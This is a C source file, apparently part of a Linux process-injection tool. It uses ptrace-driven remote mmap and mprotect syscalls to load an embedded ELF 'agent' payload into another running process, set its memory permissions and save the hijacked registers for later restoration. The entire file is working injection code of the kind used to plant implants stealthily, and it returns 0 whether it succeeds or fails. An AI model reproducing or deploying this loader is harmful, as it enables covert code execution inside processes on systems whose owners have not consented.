#include <elf.h>
#include <sys/mman.h>
#include <stdint.h>
#include "agent.h"
#include <sys/user.h>
#include "ptrace_x64_reg.h"
#include "param_struct_x64.h"
#include "reimplement.h"

#define ElfN_Ehdr Elf64_Ehdr
#define ElfN_Phdr Elf64_Phdr
#define ElfN_Addr Elf64_Addr
#define ElfN_Xword Elf64_Xword
#define ElfN_Off  Elf64_Off
#define MAX_SEGMENTS 16
#define PAGESIZE 4096

typedef struct {
    ElfN_Addr  vaddr;
    ElfN_Xword memsz;
    ElfN_Xword  flags;
} load_segment;

int is_image_valid(ElfN_Ehdr *hdr) {
    if (sys_memcmp(hdr->e_ident, ELFMAG, SELFMAG) != 0) return 0;
    if (hdr->e_ident[EI_CLASS] != ELFCLASS64) return 0;
    if (hdr->e_machine != EM_X86_64) return 0; 
    if (hdr->e_type != ET_DYN) return 0;
    if (hdr->e_phnum <= 0) return 0;
    return 1;
}

// sets the registers in the cleanup struct from the backup user_regs_struct
static inline void set_cleanup_regs(struct cleanup *clean, const struct user_regs_struct *backup) {
    clean->x[0]  = backup->r8;
    clean->x[1]  = backup->r9;
    clean->x[2]  = backup->r10;
    clean->x[3]  = backup->r11;
    clean->x[4]  = backup->r12;
    clean->x[5]  = backup->r13;
    clean->x[6]  = backup->r14;
    clean->x[7]  = backup->r15;
    clean->x[8]  = backup->rdi;
    clean->x[9]  = backup->rsi;
    clean->x[10] = backup->rbp;
    clean->x[11] = backup->rbx;
    clean->x[12] = backup->rdx;
    clean->x[13] = backup->rax;
    clean->x[14] = backup->rcx;
    clean->rsp = backup->rsp;
    clean->rip = backup->rip;
    clean->eflags = backup->eflags;
    clean->fs_backup = backup->fs_base;
    clean->cs = backup->cs;
    clean->ss = backup->ss;
    clean->original_rax = backup->orig_rax;
}

int *load_image(struct loader_params *params) {
    ElfN_Ehdr *hdr = (ElfN_Ehdr *)agent;
    if (!is_image_valid(hdr)) return 0;

    ElfN_Phdr *phdr = (ElfN_Phdr *)(agent + hdr->e_phoff);
    ElfN_Addr min_vaddr = UINT64_MAX;
    ElfN_Addr max_vaddr = 0;
    
    load_segment segments[MAX_SEGMENTS];
    int seg_count = 0;

    // Gather PT_LOAD segments to calculate memory size and protection permissions
    for (int i = 0; i < hdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (seg_count >= MAX_SEGMENTS) return 0;
            segments[seg_count++] = (load_segment) {
                .vaddr = phdr[i].p_vaddr,
                .memsz = phdr[i].p_memsz,
                .flags = phdr[i].p_flags,
            };
            if (phdr[i].p_vaddr < min_vaddr) min_vaddr = phdr[i].p_vaddr;
            if ((phdr[i].p_vaddr + phdr[i].p_memsz) > max_vaddr) max_vaddr = phdr[i].p_vaddr + phdr[i].p_memsz;
        }
    }

    size_t memsz = max_vaddr - min_vaddr;
    struct cleanup clean = {0};

    // map out memory region A
    clean.a_size = memsz + PAGESIZE;
    size_t ctx_map_len    = align_up(sizeof(clean), PAGESIZE);

    unsigned long syscall_result = 0;
    remote_syscall(params->pid, params->regs, params->syscall_rip, __NR_mmap, 0, clean.a_size + ctx_map_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0, &syscall_result);
    clean.a_addr = (uint64_t)syscall_result;
    
    if ((long)clean.a_addr <= 0) return NULL;

    ElfN_Addr pie_base = (ElfN_Addr)(((uintptr_t)clean.a_addr + (PAGESIZE - 1)) & ~(uintptr_t)(PAGESIZE - 1)) - min_vaddr;


    // write payload to allocated memory address
    write_payload(params->pid, (long)clean.a_addr, agent, agent_len);

    set_cleanup_regs(&clean, &params->backup);

    // Write the cleanup struct to the end of the allocated memory region, after the payload
    uintptr_t ctx_remote = clean.a_addr + clean.a_size;
    write_payload(params->pid, ctx_remote, (unsigned char *)&clean, sizeof(clean));
    params->cleanup_ctx_addr = ctx_remote;

    // apply memory protections based on segments
    for (int i = 0; i < seg_count; i++) {
        uintptr_t start = pie_base + segments[i].vaddr;
        uintptr_t end   = start + segments[i].memsz;
        
        // mprotect requires page-aligned addresses
        uintptr_t aligned_start = start & ~(PAGESIZE - 1);
        uintptr_t aligned_end   = (end + PAGESIZE - 1) & ~(PAGESIZE - 1);
        
        int prot = 0;
        if (segments[i].flags & PF_R) prot |= PROT_READ;
        if (segments[i].flags & PF_W) prot |= PROT_WRITE;
        if (segments[i].flags & PF_X) prot |= PROT_EXEC;
        
        remote_syscall(params->pid, params->regs, params->syscall_rip, __NR_mprotect, (unsigned long)aligned_start, aligned_end - aligned_start, prot, 0, 0, 0, &syscall_result);
    }

    params->entry_point = (void *)(pie_base + hdr->e_entry);

    memset(&clean, 0, sizeof(clean));
    __asm__ __volatile__("" ::: "memory");

    return 0;
}